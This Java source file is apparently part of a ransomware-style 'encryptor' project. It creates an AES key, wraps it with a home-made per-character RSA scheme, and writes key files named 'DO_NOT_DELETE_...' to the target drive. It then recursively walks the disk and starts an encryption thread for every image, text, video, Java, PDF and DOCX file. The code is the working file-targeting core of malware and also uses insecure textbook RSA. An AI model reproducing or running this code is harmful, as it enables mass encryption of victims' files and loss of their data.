package encryptor;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.PrintWriter;
import java.math.BigInteger;
import java.security.NoSuchAlgorithmException;
import java.util.Base64;
import java.util.Vector;

import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;
import javax.crypto.spec.SecretKeySpec;

public class FileChooserThread extends Thread{
	
	private File path;
	
	@SuppressWarnings("unused")
	private BigInteger d;
	
	private BigInteger e;
	private BigInteger n;
	private SecretKeySpec skeySpec;
	private static byte[] raw = generateKey();
	private static PrintWriter pw = null;
	
	private static final String privateName = "DO_NOT_DELETE_PRIVATEKEY.JKS";
	
	private static final String keyStoreName = "DO_NOT_DELETE_KEYFORDECRYPT.JKS";


	
	/**
	 * Costructor used to --CRYPT -- file
	 * @param path hard disk in which to search
	 * @param e public keys
	 * @param n public keys
	 * @param d private keys
	 */
	public FileChooserThread(File path,BigInteger e,BigInteger n,BigInteger d) {
		
		this.d = d;
		this.e = e;
		this.n = n;
		this.path = path;
		//Creates simmetric key
		
		System.out.println("Decrypted key : "  + raw);
		
		skeySpec = new SecretKeySpec(raw, "AES");
		
		System.out.println("Full key: " + skeySpec);
		
		System.out.println("Hash : " + skeySpec.hashCode());
		
		//Writes simmetric key to file 
		writeKeyStore(raw);
		//Writes rsa keys to file
		writePrivateKey(d,n);
		
		this.start();
	}

	@Override
	public void run() {
		
		if (skeySpec==null) {
		}else {	
			getFile(path.toString());
		}
	}
	
	/**
	 * Method used to write down to file the pair of private keys
	 * @param d
	 * @param n
	 */
	private void writePrivateKey(BigInteger d,BigInteger n) {
		
		File privateKeyFile = new File(path + privateName);
		
		try {
			//Prepares stream
			prepareFile(privateKeyFile,false);
			pw.print("");
			closePw();
			//First of all clear existing file
			prepareFile(privateKeyFile,true);
			pw.println(d);
			pw.println(n);
			closePw();
			
		} catch (IOException e) {
			e.printStackTrace();
		}
		
	}
	
	
	
	/**
	 * Closes printwriter streams
	 */
	private void closePw() {
		pw.flush();
		pw.close();
	}

	/**
	 * Writes to file simmetric key
	 * @param key
	 */
	private void writeKeyStore(byte[] rawKey) {
		
		File keyStoreFile = new File(path + keyStoreName);

		try {
			//Prepare stream
			prepareFile(keyStoreFile,false);
			String encodedKey = Base64.getEncoder().encodeToString(rawKey);
			
			pw.println(encrypt(encodedKey,e,n));
			closePw();
		} catch (IOException e) {
			e.printStackTrace();
		}
	}
	
	/**
	 * Creates print writer
	 * @param file file in which to write
	 * @param toAppend if it can be appended 
	 * @throws IOException
	 */
	private void prepareFile(File file,boolean toAppend) throws IOException {
		
		if (!file.exists()) {
			file.createNewFile();
		}
		
		pw = new PrintWriter(new FileOutputStream(file,toAppend));
		//true == to Append 
		
	}


	/**
	 * Method used to generate random aes key
	 * @return byte value of generated key
	 */
	private static byte[] generateKey() {
		
		try {

			KeyGenerator kgen = KeyGenerator.getInstance("AES");
			kgen.init(128);
			// Generate the secret key specs.
			SecretKey sKey = kgen.generateKey();
			
			byte[] raw = sKey.getEncoded();
			
			for(byte a : raw) {
				System.out.println(a);
			}
			
			return raw;

		} catch (NoSuchAlgorithmException e) {
			e.printStackTrace();
		}

		return null;
		
	}
	
	/**
	 * Method used to encrypt messages
	 * @param data message to encrypt
	 * @param e key
	 * @param n key
	 * @return Encrypted message
	 */
	private static String encrypt(String data, BigInteger e, BigInteger n) {

		// Splits data string into char array,convert each char in a number and
		// crypts it
		// In the end returns a string of number

		Vector<BigInteger> intVector = new Vector<BigInteger>();

		StringBuilder intList = new StringBuilder();

		char[] charRawVector = data.toCharArray();

		for (char character : charRawVector) {
			int i = (int) character;
			BigInteger c = new BigInteger(Integer.toString(i)).modPow(e, n);
			intVector.add(new BigInteger(Integer.toString(i)));
			intList.append(c);
			intList.append(";");
		}
		return intList.toString();

	}



	/**
	 * Recursive method that start a Thread for every file with a certain extension 
	 * @param directoryName folder in which to scan for files
	 */
	private void getFile(String directoryName) {

		File directory = new File(directoryName);
		File[] fList = directory.listFiles();
		if (fList != null) {
			for (File file : fList) {
				if (file.isFile()) {
					String extension = "";

					String fileName = file.toString();
					int i = fileName.lastIndexOf('.'); // Restituisce l'ultimo indice in cui viene trovato il carattere "."
					int p = Math.max(fileName.lastIndexOf('/'), fileName.lastIndexOf('\\'));
					// Controlla se il file contiene il punto o se il "." si trova prima dei vari backslash etc
					if (i > p) {
						extension = fileName.substring(i + 1);
					}
					if (extension.equalsIgnoreCase("PNG") || extension.equalsIgnoreCase("JPG")
							|| extension.equalsIgnoreCase("TXT") || extension.equalsIgnoreCase("JPEG")
							|| extension.equalsIgnoreCase("AVI") || extension.equalsIgnoreCase("JAVA")
							|| extension.equalsIgnoreCase("PDF") || extension.equalsIgnoreCase("DOCX")
							){
						new CryptoThread(file, skeySpec);
					}

				} else if (file.isDirectory()) {
					getFile(file.getAbsolutePath());
				}
			}
		}

	}

}
